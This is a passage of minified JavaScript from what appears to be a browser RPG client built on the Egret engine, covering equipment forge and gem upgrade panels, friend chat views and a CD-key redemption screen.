t=l.ForgeCT.ins().getEnhanceCostConfigByLv(this.lv+1),e=0;t&&(this.itemNum=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,t.stoneId),e=t.stoneNum);var i="";i=this.itemNum>=e?y.ColorUtil.GREEN_COLOR:y.ColorUtil.RED_COLOR,this.countLabel.textFlow=C.TextFlowMaker.generateTextFlow("<font color="+i+">"+this.itemNum+"</font><font color="+y.ColorUtil.WHITE_COLOR+">/"+e+"</font> ")},e.prototype.getAttrByType=function(t,e){for(var i=t.length,n=0;i>n;n++)if(t[n].type==e.type&&t[n].value!=e.value)return""+t[n].value;return""},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"forge_qh"},enumerable:!1,configurable:!0}),e}(n.BaseView);e.ForgeBoostPanel=b,window.ForgeBoostPanel=b,__reflect(b.prototype,"ForgeBoostPanel",[]),window.ForgeBoostPanel=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeGemPanel=void 0;var n=i(1),o=i(139),s=i(6),a=i(1625),r=i(96),l=i(63),h=i(69),u=i(38),p=i(13),d=i(115),c=i(34),f=i(21),g=i(0),m=i(4),v=i(2),y=i(22),C=i(18),T=i(5),b=i(72),w=function(t){function e(){var e=t.call(this)||this;return e._curRole=0,e.isMax=!1,e.isAutoUp=!1,e.itemNum=0,e.eqIndexItems=[],e.isclick=!1,e.isPlay=!1,e.name=gettext("注灵"),e.curPanel=o.ForgeWin.Page_Select_Gem,e}return __extends(e,t),e.prototype.addDisplay=function(){var t=this;observe(this,this.setCount,s.BagCT.ins().postItemAdd),observe(this,this.setCount,s.BagCT.ins().postItemChange),observe(this,function(){t.curRole=t.curRole,t.updateCallBack()},a.GemCT.ins().postForgeUpdata),this.addTouchEvent(this.upGradeBtn,this.updateDown,!0),this.upGradeBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this)},e.prototype.changeClick=function(){this.isclick=!1},e.prototype.updateDown=function(){var t=r.ForgeCT.ins().getStoneLevelCostConfigByLv(this.lv+1);!this.isclick&&t&&(this.itemNum>=t.soulNum?(a.GemCT.ins().sendUpGrade(this.curRole,this.pos),h.SoundUtil.play(h.SoundEnum.FORGE)):(this.isclick=!0,l.WarnCT.ins().setBuyGoodsWarn(t.stoneId,t.soulNum-this.itemNum)))},e.prototype.removeDisplay=function(){this.removeTouchEvent(this.upGradeBtn,this.updateDown),this.stopAutoUp(),this.upGradeBtn&&this.upGradeBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this)},e.prototype.skinComplete=function(){this.getItemTxt.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.getItemTxt.text+"</u>"),this.addTouchEvent(this.getItemTxt,this.onGetItem);for(var t=0;t<u.EquipCT.FOEGE_MAX;t++)this.eqIndexItems.push(this["item"+t]),this.addTouchEvent(this["item"+t],this.onSelectItem);this.curRole=this.curRole},Object.defineProperty(e.prototype,"curRole",{get:function(){return this._curRole},set:function(t){if(this._curRole=t,this.skin){var e=p.SubRoles.ins().getSubRoleByIndex(this._curRole),i=e.getMinEquipIndexByType(this.curPanel);this.isMax=!1,this.changeData(i,e.getEquipByIndex(i).gem,!0,!0);for(var n=0;n<u.EquipCT.FOEGE_MAX;n++)this["item"+n].setSelect(n==this.pos);this.stopAutoUp(),this.cleanEff(),this.playEff()}},enumerable:!1,configurable:!0}),e.prototype.stopAutoUp=function(){this.isAutoUp=!1,Timer.stop(this.autoUpStar,this)},e.prototype.autoUpStar=function(){var t=r.ForgeCT.ins().getStoneLevelCostConfigByLv(this.lv+1);this.itemNum>=t.soulNum?(a.GemCT.ins().sendUpGrade(this.curRole,this.pos),h.SoundUtil.play(h.SoundEnum.FORGE)):(this.isAutoUp=!1,Timer.stop(this.autoUpStar,this))},e.prototype.setPower=function(){var t=p.SubRoles.ins().getSubRoleByIndex(this.curRole);this._totalPower=t.getForgeTotalPower(this.curPanel),this._totalPower+=Math.floor(this._totalPower*d.DemonCir.ins().getAddPerBySysIDRoleId(c.AttrSystemID.asStone,this.curRole)/1e4),this.powerPanel.setPower(this._totalPower)},e.prototype.changeData=function(t,e,i,n){void 0===i&&(i=!0),void 0===n&&(n=!1),this.pos=t,this.lv=e,this.setPower(),i&&this.setCount(),this.updateItem(n),this.setAttrData()},e.prototype.addBarEff=function(t){var e="ProgressEff5",i=new f.MovieClip;i.playFile(RES_DIR_EFF+e,-1),t.addChild(i),i.x=t.width/2,i.y=t.height/2,i.scaleX=t.width/466,i.scaleY=t.height/16,t.scaleX=0,t.scaleY=0},e.prototype.moveBarEff=function(t,e,i){var n=1,o=1e3*t[e?"width":"height"]/160,s={};s[e?"scaleX":"scaleY"]=1,t[e?"scaleY":"scaleX"]=1;var a=egret.Tween.get(t);a.to(s,o/n).call(function(){i&&i()})},e.prototype.playEff=function(){var t=this;if(!this.isPlay){for(var e=[11,12,13,14,15,16,17,18,19,21,22,23,24,25,28],i=0;i<=e.length-1;i++)this.addBarEff(this["bar"+e[i]]);this.moveBarEff(this.bar21,!1),this.moveBarEff(this.bar11,!1,function(){t.moveBarEff(t.bar13,!0),t.moveBarEff(t.bar22,!0),t.moveBarEff(t.bar23,!0),t.moveBarEff(t.bar12,!0,function(){t.moveBarEff(t.bar24,!1),t.moveBarEff(t.bar14,!1,function(){t.moveBarEff(t.bar25,!0),t.moveBarEff(t.bar15,!0,function(){t.moveBarEff(t.bar16,!0,function(){t.moveBarEff(t.bar17,!1,function(){t.moveBarEff(t.bar28,!0),t.moveBarEff(t.bar18,!0,function(){t.moveBarEff(t.bar19,!1,function(){t.isPlay=!1})})})})})})})})}},e.prototype.cleanEff=function(){for(var t=[11,12,13,14,15,16,17,18,19,21,22,23,24,25,28],e=0;e<t.length;e++)this["bar"+t[e]].removeChildren()},e.prototype.updateCallBack=function(){var t=this,e=new f.MovieClip;e.x=this["new"].x+this["new"].width/2,e.y=this["new"].y+this["new"].height/2,this.itemGroup2.addChild(e),e.playFile(RES_DIR_EFF+"UpEff1",1,function(){var e=p.SubRoles.ins().getSubRoleByIndex(t.curRole),i=e.equipsData,n={item:i[t.pos].item.itemConfig,pos:t.pos,lv:i[t.pos].gem,itemNum:t.itemNum,isZZ:!1};t.now.data=n,n.lv=i[t.pos].gem+1,t["new"].data=n})},e.prototype.updateItem=function(t){for(var e=p.SubRoles.ins().getSubRoleByIndex(this.curRole),i=e.equipsData,n=0;n<u.EquipCT.FOEGE_MAX;n++){var o=i[n].gem,a=this.itemNum;if(t&&n==this.pos){var r=g.GlobalConfig.StoneOpenConfig[n];m.ActorCC.level>=r.openLv&&(this.lv=i[this.pos].gem,this["item"+n].setSelect(!0),this.xjyl.visible=!1);var l={item:i[n].item.itemConfig,pos:n,lv:o,itemNum:this.itemNum,isZZ:!1};this.now.data=l,l.lv=o+1,this["new"].data=l}if(!a){var h=i[n].gem?i[n].gem:1,d=g.GlobalConfig.StoneLevelCostConfig[h];d&&(a=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,d.stoneId))}this["item"+n].data={item:i[n].item.itemConfig,pos:n,lv:i[n].gem,itemNum:a}}},e.prototype.onSelectItem=function(t){var e=this.eqIndexItems.indexOf(t.currentTarget);if(-1!=e){this.isPlay&&(this.isPlay=!1,this.cleanEff());for(var i=this.pos,n=0;n<u.EquipCT.FOEGE_MAX;n++){var o=this["item"+n];o.getSelect()&&(i=n),o.setSelect(!1)}var s=!1,a=p.SubRoles.ins().getSubRoleByIndex(this.curRole),r=a.equipsData,l=g.GlobalConfig.StoneOpenConfig[e],h="";switch(t.currentTarget){case this["item"+e]:if(m.ActorCC.level>=l.openLv){this.cleanEff(),this.playEff(),this.pos=e,this.lv=r[this.pos].gem,s=!0,this["item"+e].setSelect(!0),this.xjyl.visible=!1;var d={item:r[e].item.itemConfig,pos:e,lv:r[e].gem,itemNum:this.itemNum,isZZ:!1};this.now.data=d,d.lv=r[e].gem+1,this["new"].data=d}else h=gettext("{0}级开启",l.openLv)}s||(this["item"+i].setSelect(!0),v.TipsCT.ins().showTips(h)),this.setAttrData(),this.setCount()}},e.prototype.setAttrData=function(){var t;t=r.ForgeCT.ins().getForgeConfigByPos(this.pos,this.lv,this.curPanel);var e=t.attr||[];e=d.DemonCir.ins().getAttrsBySysID(e,c.AttrSystemID.asStone);var i=e&&e.length?e.length:0;e&&i>0&&e.sort(y.AttributeData.sortAttribute);for(var n=0;4>n;n++)this["attr"+n].text=i>n?y.AttributeData.getAttStrByType1(e[n],b.AttributeFormat.FORMAT_0()):"";var o;o=r.ForgeCT.ins().getForgeConfigByPos(this.pos,this.lv+1,this.curPanel);var s="";if(o){this.isMax=!1;var a=o.attr||[];a=d.DemonCir.ins().getAttrsBySysID(a,c.AttrSystemID.asStone),a.sort(y.AttributeData.sortAttribute);for(var n=0;4>n;n++){var l="";if(i>n){var h=e[n];l=this.getAttrByType(a,h)}this["arrow"+n].visible=l.length>0,this["addAttr"+n].text=l}}else{this.isMax=!0;for(var n=0;4>n;n++)this["arrow"+n].visible=!1,this["addAttr"+n].text=""}this.attr.text=s,this.upInfo.visible=!this.isMax,this.maxDesc.visible=this.isMax,this.maxDesc.visible&&(this.now.hideAdd(),this["new"].hideAdd())},e.prototype.onGetItem=function(){var t=r.ForgeCT.ins().getStoneLevelCostConfigByLv(this.lv+1);l.WarnCT.ins().setBuyGoodsWarn(t.stoneId,1)},e.prototype.setCount=function(){var t=r.ForgeCT.ins().getStoneLevelCostConfigByLv(this.lv+1);if(t){var e=t.soulNum;this.itemNum=m.ActorCC.soul;var i;i=this.itemNum>=e?C.ColorUtil.GREEN_COLOR:C.ColorUtil.RED_COLOR,this.countLabel.textFlow=T.TextFlowMaker.generateTextFlow("<font color="+i+">"+this.itemNum+"</font><font color="+C.ColorUtil.WHITE_COLOR+">/"+e+"</font> "),this.buyStoneUpdateItem()}},e.prototype.buyStoneUpdateItem=function(){this.updateItem()},e.prototype.getAttrByType=function(t,e){if(!e)return"";for(var i=t.length,n=0;i>n;n++)if(t[n].type==e.type&&t[n].value!=e.value)return""+t[n].value;return""},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"forge_fm"},enumerable:!1,configurable:!0}),e}(n.BaseView);e.ForgeGemPanel=w,window.ForgeGemPanel=w,__reflect(w.prototype,"ForgeGemPanel",[]),window.ForgeGemPanel=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GemCT=void 0;var n=i(14),o=i(13),s=i(96),a=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.Gem,e.regNetMsg(2,e.postForgeUpdata),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postForgeUpdata=function(t){var e=t.readShort(),i=o.SubRoles.ins().getSubRoleByIndex(e),n=i.parseForgeChange(t,this.sysId);s.ForgeCT.ins().postForgeUpdate(this.sysId,n)},e.prototype.sendUpGrade=function(t,e){var i=this.getBytes(2);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},e.ROLL_NUM=8,__decorate([post()],e.prototype,"postForgeUpdata",null),e}(n.BaseSystem);e.GemCT=a,window.GemCT=a,__reflect(a.prototype,"GemCT",[]),Systemap.GemCT=function(){return a.ins()},window.GemCT=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeZhuItem=void 0;var n=i(3),o=i(0),s=i(4),a=i(96),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CastingZBItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){"boolean"==typeof this._isSelect&&this.setSelect(this._isSelect),this.ishide&&this.hideAdd()},e.prototype.updateItem=function(t,e,i,n,r){void 0===r&&(r=!0),this.add.visible=i>0;var l=o.GlobalConfig.StoneOpenConfig[e];if(s.ActorCC.level>=l.openLv){var h=a.ForgeCT.ins().getStoneLevelCostConfigByLv(i+1),u=0;h&&(u=h.soulNum),this.state.visible=n>=u,i>=80&&(this.state.visible=!1),this.num0.source="lv_"+(i>99?Math.floor(i/100):i>9?Math.floor(i/10):i)+"_png",this.num1.source=""+(i>99?"lv_"+Math.floor(i/10%10)+"_png":i>9?"lv_"+i%10+"_png":""),this.num2.source=""+(i>99?"lv_"+i%100%10+"_png":""),t?this.setItemImg(t.icon):this.setItemImg("xb_"+(e+10).toString()),this.unlock.visible=!1,this.openLv.visible=!1}else this.state.visible=!1,this.unlock.visible=!0,this.openLv.visible=!0,this.add.visible=!1,this.setItemImg("xb_"+(e+10)),this.openLv.text=l.openLv+"";this.num1.visible=this.num0.visible=this.num2.visible=this.add.visible,r||(this.state.visible=!1)},e.prototype.hideAdd=function(){this.ishide=!0,this.skin&&(this.add.visible=!1,this.num0.visible=!1,this.num1.visible=!1,this.num2.visible=!1)},e.prototype.setItemImg=function(t){this.itemIcon.setIcon(t)},e.prototype.setSelect=function(t){this._isSelect=t,this.select&&(this.select.visible=t)},e.prototype.getSelect=function(){return this._isSelect},e.prototype.dataChanged=function(){var t=this.data.isZZ;this.updateItem(this.data.item,this.data.pos,this.data.lv,this.data.itemNum,"boolean"==typeof t?t:!0)},e}(n.BaseItemRender);e.ForgeZhuItem=r,window.ForgeZhuItem=r,__reflect(r.prototype,"ForgeZhuItem",[]),window.ForgeZhuItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForgeZhulingPanel=void 0;var n=i(1),o=i(139),s=i(6),a=i(1628),r=i(96),l=i(63),h=i(69),u=i(13),p=i(2),d=i(22),c=i(115),f=i(34),g=i(38),m=i(18),v=i(5),y=i(537),C=function(t){function e(){var e=t.call(this)||this;return e._curRole=0,e.isMax=!1,e.isAutoUp=!1,e.itemNum=0,e.startPos=0,e.isclick=!1,e.name=gettext("淬炼"),e.curPanel=o.ForgeWin.Page_Select_ZhuLing,e}return __extends(e,t),e.prototype.skinComplete=function(){this.getItemTxt.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.getItemTxt.text+"</u>"),this.addTouchEvent(this.upGradeBtn0,this.onTouch),this.addTouchEvent(this.getItemTxt,this.onGetItem),this.selfAttrList.itemRenderer=y.ComAttrBasicItem,this.selfAttrList.dataProvider=this.listArr=new eui.ArrayCollection,this.nextAttrList.itemRenderer=y.ComAttrBasicItem,this.nextAttrList.dataProvider=this.nextListArr=new eui.ArrayCollection,this.curRole=0},e.prototype.addDisplay=function(){var t=this;observe(this,this.setCount,s.BagCT.ins().postItemAdd),observe(this,this.setCount,s.BagCT.ins().postItemChange),observe(this,function(){return t.curRole=t.curRole},a.ZhuLingCT.ins().postForgeUpdata),this.addTouchEvent(this.upGradeBtn,this.updateDown,!0),this.upGradeBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this)},e.prototype.changeClick=function(){this.isclick=!1},e.prototype.updateDown=function(){!this.isclick&&this.costConfig&&(this.itemNum>=this.costConfig.count?(a.ZhuLingCT.ins().sendUpGrade(this.curRole,this.pos),h.SoundUtil.play(h.SoundEnum.FORGE)):(this.isclick=!0,l.WarnCT.ins().setBuyGoodsWarn(this.costConfig.itemId,1)))},e.prototype.removeDisplay=function(){this.stopAutoUp(),this.removeTouchEvent(this.upGradeBtn,this.updateDown,!0),this.upGradeBtn&&this.upGradeBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.changeClick,this)},Object.defineProperty(e.prototype,"curRole",{get:function(){return this._curRole},set:function(t){if(this._curRole=t,this.skin){var e=u.SubRoles.ins().getSubRoleByIndex(this._curRole),i=e.getMinEquipIndexByType(this.curPanel);this.isMax=!1,this.createBitMapNum(),this.changeData(i,e.getEquipByIndex(i).zhuling),this.stopAutoUp()}},enumerable:!1,configurable:!0}),e.prototype.onTouch=function(t){switch(t.target){case this.upGradeBtn0:this.isAutoUp||(this.isAutoUp=!0,this.startPos=this.pos,this.autoUpStarEx()||(p.TipsCT.ins().showTips(gettext("材料不足")),this.isAutoUp=!1))}},e.prototype.stopAutoUp=function(){this.isAutoUp=!1,this.upGradeBtn0&&(this.upGradeBtn0.label=gettext("一键精炼")),Timer.stop(this.autoUpStar,this)},e.prototype.autoUpBack=function(t){if(this.isAutoUp){var e=r.ForgeCT.ins().getZhulingCostConfigByLv(this.lv+1);if(!e)return;if(this.itemNum<e.count)return this.isAutoUp=!1,void p.TipsCT.ins().showTips(gettext("材料不足"));if(this.startPos==t)return void(this.isAutoUp=!1);a.ZhuLingCT.ins().sendUpGrade(this.curRole,t)}},e.prototype.autoUpStarEx=function(){var t=r.ForgeCT.ins().getZhulingCostConfigByLv(this.lv+1);return t?this.itemNum>=t.count?(a.ZhuLingCT.ins().sendUpGrade(this.curRole,this.pos),h.SoundUtil.play(h.SoundEnum.FORGE),!0):(this.upGradeBtn0.label=gettext("一键精炼"),!1):!1},e.prototype.autoUpStar=function(){this.costConfig&&this.itemNum>=this.costConfig.count?(a.ZhuLingCT.ins().sendUpGrade(this.curRole,this.pos),7==this.pos&&(this.isAutoUp=!1,this.upGradeBtn0.label=gettext("一键精炼"),Timer.stop(this.autoUpStar,this))):(this.isAutoUp=!1,this.upGradeBtn0.label=gettext("一键精炼"),Timer.stop(this.autoUpStar,this))},e.prototype.onGetItem=function(t){l.WarnCT.ins().setBuyGoodsWarn(this.costConfig.itemId,1)},e.prototype.changeData=function(t,e,i){void 0===t&&(t=this.pos),void 0===e&&(e=this.lv),void 0===i&&(i=!0),this.pos=t,this.lv=e;var n=r.ForgeCT.ins().countAllBoostAttr(this.curRole,this.curPanel);this.setAttrData(n),this.setPower(),this.setSlectedInfo(),this.updateLevel(),i&&this.setCount()},e.prototype.setPower=function(){var t=u.SubRoles.ins().getSubRoleByIndex(this.curRole);this._totalPower=t.getForgeTotalPower(this.curPanel),this._totalPower+=Math.floor(this._totalPower*c.DemonCir.ins().getAddPerBySysIDRoleId(f.AttrSystemID.asZhuLing,this._curRole)/1e4),this.powerPanel.setPower(this._totalPower)
},e.prototype.createBitMapNum=function(){for(var t=0;t<g.EquipCT.FOEGE_MAX;t++)this["level_"+t].text="0"},e.prototype.updateLevel=function(){for(var t=u.SubRoles.ins().getSubRoleByIndex(this.curRole),e=t.equipsData,i=0;i<g.EquipCT.FOEGE_MAX;i++){var n=e[i].zhuling;this["level_"+i].visible=n>0,this["level_"+i].text=n.toString()}},e.prototype.setSlectedInfo=function(){for(var t=0;t<g.EquipCT.FOEGE_MAX;t++)if(this["selectIcon"+t].visible=t==this.pos,0==t);else{var e="refines_jl"+t+"_";this["line"+(t-1)].source=t<=this.pos?e+"1":e+"0",this["jinglianed"+t].visible=t<=this.pos}},e.prototype.setAttrData=function(t){var e;if(e=r.ForgeCT.ins().getForgeConfigByPos(this.pos,this.lv+1,this.curPanel),this.isMax=!e,this.currentState=this.isMax?"max":"normal",this.validateNow(),t=c.DemonCir.ins().getAttrsBySysID(t,f.AttrSystemID.asZhuLing),t.sort(d.AttributeData.sortAttribute),!t.length)for(var i=r.ForgeCT.ins().countAllBoostAttr(this.curRole,this.curPanel,this.pos,!0),n=0;n<i.length;n++){var o=i[n],s=new d.AttributeData(o.type,0);t.push(s)}if(this.listArr.source=t,e){var i=r.ForgeCT.ins().countAllBoostAttr(this.curRole,this.curPanel,this.pos,!0);i=c.DemonCir.ins().getAttrsBySysID(i,f.AttrSystemID.asZhuLing),i.sort(d.AttributeData.sortAttribute),this.nextListArr.source=i}},e.prototype.setCount=function(){this.costConfig=r.ForgeCT.ins().getZhulingCostConfigByLv(this.lv+1);var t=0;this.costConfig&&(this.itemNum=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,this.costConfig.itemId),t=this.costConfig.count);var e="";e=this.itemNum>=t?m.ColorUtil.GREEN_COLOR:m.ColorUtil.RED_COLOR,this.countLabel.textFlow=v.TextFlowMaker.generateTextFlow("<font color="+e+">"+this.itemNum+"</font><font color="+m.ColorUtil.WHITE_COLOR+">/"+t+"</font> ")},e.prototype.getAttrByType=function(t,e){for(var i=t.length,n=0;i>n;n++)if(t[n].type==e.type&&t[n].value!=e.value)return""+t[n].value;return""},e.prototype.tabRp=function(){var t=u.SubRoles.ins().getSubRoleByIndex(this._curRole),e=t.getMinEquipIndexByType(this.curPanel),i=t.getEquipByIndex(e).zhuling,n=r.ForgeCT.ins().getZhulingCostConfigByLv(i+1);if(!n)return!1;var o=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,n.itemId);return o>=n.count},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"forge_cl"},enumerable:!1,configurable:!0}),e}(n.BaseView);e.ForgeZhulingPanel=C,window.ForgeZhulingPanel=C,__reflect(C.prototype,"ForgeZhulingPanel",[]),window.ForgeZhulingPanel=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZhuLingCT=void 0;var n=i(14),o=i(13),s=i(96),a=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.Zhuling,e.regNetMsg(2,e.postForgeUpdata),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postForgeUpdata=function(t){var e=t.readShort(),i=o.SubRoles.ins().getSubRoleByIndex(e),n=i.parseForgeChange(t,this.sysId);s.ForgeCT.ins().postForgeUpdate(this.sysId,n)},e.prototype.sendUpGrade=function(t,e){var i=this.getBytes(2);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},__decorate([post()],e.prototype,"postForgeUpdata",null),e}(n.BaseSystem);e.ZhuLingCT=a,window.ZhuLingCT=a,__reflect(a.prototype,"ZhuLingCT",[]),Systemap.ZhuLingCT=function(){return a.ins()},window.ZhuLingCT=a},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FriendChatPanel=void 0;var n=i(24),o=i(1),s=i(0),a=i(4),r=i(32),l=i(23),h=i(2),u=i(26),p=i(93),d=i(181),c=i(1635),f=i(1636),g=function(t){function e(){var e=t.call(this)||this;return e.name=gettext("最近"),e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];"7000183"==urlParam.appid&&window.mz?(this.chatGroup.touchChildren=!1,this.chatGroup.touchEnabled=!0):(this.chatGroup.touchChildren=!0,this.chatGroup.touchEnabled=!1),p.Friends.ins().sendFriendsList(),p.Friends.ins().sendRecentList(),this.listFriend.selectedIndex=this.selectedIndex=t[0]?t[0]:0,observe(this,this.updateView,p.Friends.ins().postFriendChange),observe(this,this.updateView,p.Friends.ins().postChatToFriend),observe(this,this.updateInputText,l.GameLogic.ins().postInputText),this.onChange()},e.prototype.skinComplete=function(){this.listFriend.dataProvider=null,this.listChat.dataProvider=null,this.listFriend.itemRenderer=c.FriendHeadItem,this.listChat.itemRenderer=f.FriendsChatItemRender,this.addTouchEvent(this.listFriend,this.onChange),this.addTouchEvent(this.btnSend,this.onTap),this.addTouchEvent(this.faceBtn,this.onTap),this.addTouchEvent(this.chatGroup,this.onTap),this.addTouchEvent(this.listChat,this.onListTap),this.input.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this)},e.prototype.updateInputText=function(t){this.input.text=t,this.textInOn()},e.prototype.textInOn=function(){"请输入"==this.input.text&&(this.input.text="")},e.prototype.onListTap=function(){var t=this.listChat.selectedItem;if(t&&t instanceof d.ChatData){var e=t.msg;e&&e.indexOf("|E:")>=0&&this.onLink(e)}},e.prototype.onLink=function(t){var e=t.indexOf("|E:");t=t.slice(e+3,Number.MAX_VALUE);var i;if(t.indexOf(",")>=0?i=t.split(","):t.indexOf("*")>=0&&(i=t.split("*")),i&&!(i.length<=0))switch(i[0]){case"1":if(s.GlobalConfig.TeamFuBenBaseConfig.needZsLv>u.ZsCT.ins().stage)return void h.TipsCT.ins().showTips(gettext("{0}转后可以挑战",s.GlobalConfig.TeamFuBenBaseConfig.needZsLv));r.FbCT.ins().sendEnterTFRoom(+i[1])}},e.prototype.updateView=function(){this.listFriend.dataProvider=p.Friends.ins().recentList,-1==this.listFriend.selectedIndex&&(this.listFriend.selectedIndex=0),this.selectedIndex=this.listFriend.selectedIndex;var t=this.listFriend.dataProvider,e=t.source[this.listFriend.selectedIndex];e?(this.currentState="chat",this.listChat.dataProvider=e.acMsg,this.scroller.viewport.validateNow(),this.scroller.viewport.contentHeight>this.scroller.height&&(this.scroller.viewport.scrollV=this.scroller.viewport.contentHeight-this.scroller.height)):this.currentState="nofriend"},e.prototype.onChange=function(){this.updateView();var t=this.listFriend.dataProvider,e=t.source[this.listFriend.selectedIndex];e&&p.Friends.ins().sendRecentChat(e.id)},e.prototype.onTap=function(t){switch(t.target){case this.btnSend:var e=this.listFriend.dataProvider,i=e.source[this.listFriend.selectedIndex];if(!i)return;if(1e3*u.ZsCT.ins().lv+a.ActorCC.level<s.GlobalConfig.FriendLimit.chatLv||a.ActorCC.vip<s.GlobalConfig.FriendLimit.vipLv);else if(this.input.text.length>s.GlobalConfig.FriendLimit.contentLimit)h.TipsCT.ins().showTips(gettext("你说的话太长了"));else if(this.input.text.length>0){if(1e3*i.zs+i.lv<s.GlobalConfig.FriendLimit.chatLv||i.vip<s.GlobalConfig.FriendLimit.vipLv)return void h.TipsCT.ins().showTips(gettext("好友未开启聊天功能"));p.Friends.ins().sendChat(i,this.input.text+""),this.selectedIndex=0,this.input.text=""}break;case this.faceBtn:win.open("ChatEmojiWin",this.input);break;case this.chatGroup:observe(this,this.updateInputText,l.GameLogic.ins().postInputText),"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(2,this.input.text+""||"")}},e}(o.BaseView);e.FriendChatPanel=g,window.FriendChatPanel=g,__reflect(g.prototype,"FriendChatPanel",[]),window.FriendChatPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FriendHeadItem=void 0;var n=i(3),o=i(164),s=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.label_name.text=t.name,this.img_userIcon.source="head_"+t.job+t.sex,this.imgBg.source=o.ChatListItemRenderer.HEAD_BG[t.sex]},e}(n.BaseItemRender);e.FriendHeadItem=s,window.FriendHeadItem=s,__reflect(s.prototype,"FriendHeadItem",[]),window.FriendHeadItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FriendsChatItemRender=void 0;var n=i(3),o=i(186),s=i(4),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.label_msg&&(this.label_msg.wordWrap=!1),this.label_msg.visible=!1,this.emojiTxt=new o.EmojiText,this.emojiTxt.x=17,this.emojiTxt.y=2,this.emojiTxt.lineSpacing=8,this.group_bubble.addChild(this.emojiTxt)},e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this);var e,i,n=this.data;n.fromActor.id==s.ActorCC.actorID?(n.fromActor.name=s.ActorCC.myName,e="0xE5B613",i="0xE5B613"):(e=n.fromActor.sex?"0xBC8787":"0x318ECE",i="0xFFFFFF"),this.label_date.text=n.dateStr;var o="|C:"+e+"&T:"+n.fromActor.name+"|:|C:"+i+"&T:"+n.msg+"|";this.emojiTxt.textWidth=this.group_bubble.width,this.emojiTxt.richText=o,this.emojiTxt.textColor=i,this.height=this.emojiTxt.uHeight+14+this.label_date.textHeight},e}(n.BaseItemRender);e.FriendsChatItemRender=a,window.FriendsChatItemRender=a,__reflect(a.prototype,"FriendsChatItemRender",[]),window.FriendsChatItemRender=a},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CdkeyPanle=void 0;var n=i(1),o=i(1640),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CDkeySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.input.maxChars=28},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.sendBtn,this.onTap)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.sendBtn:o.CDKey.ins().sendCdkey(this.input.text)}},e}(n.BaseView);e.CdkeyPanle=s,window.CdkeyPanle=s,__reflect(s.prototype,"CdkeyPanle",[]),window.CdkeyPanle=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CDKey=void 0;var n=i(14),o=i(2),s=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.CDKey,e.regNetMsg(1,e.doChangeResult),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendCdkey=function(t){if(t.length<=0)return void o.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:请输入激活码|"));var e=this.getBytes(1);e.writeString(t),this.sendToServer(e)},e.prototype.doChangeResult=function(t){var e,i=t.readByte();switch(i){case 0:e=gettext("|C:0x35e62d&T:兑换成功,请在邮件中领取奖励|");break;case 1:e=gettext("|C:0xf3311e&T:激活码已被使用|");break;case 2:e=gettext("|C:0xf3311e&T:激活码不存在|");break;case 3:e=gettext("|C:0xf3311e&T:已使用过同类型|");break;case 4:e=gettext("|C:0xf3311e&T:激活码无效|");break;case 5:e=gettext("|C:0xf3311e&T:不在使用时间内|");break;case 6:e=gettext("|C:0xf3311e&T:账号兑换达到上限|");break;case 7:e=gettext("|C:0xf3311e&T:区服兑换达到上限|")}o.TipsCT.ins().showTips(e)},e}(n.BaseSystem);e.CDKey=s,window.CDKey=s,__reflect(s.prototype,"CDKey",[]),Systemap.CDKey=function(){return s.ins()},window.CDKey=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameNoticePanle=void 0;var 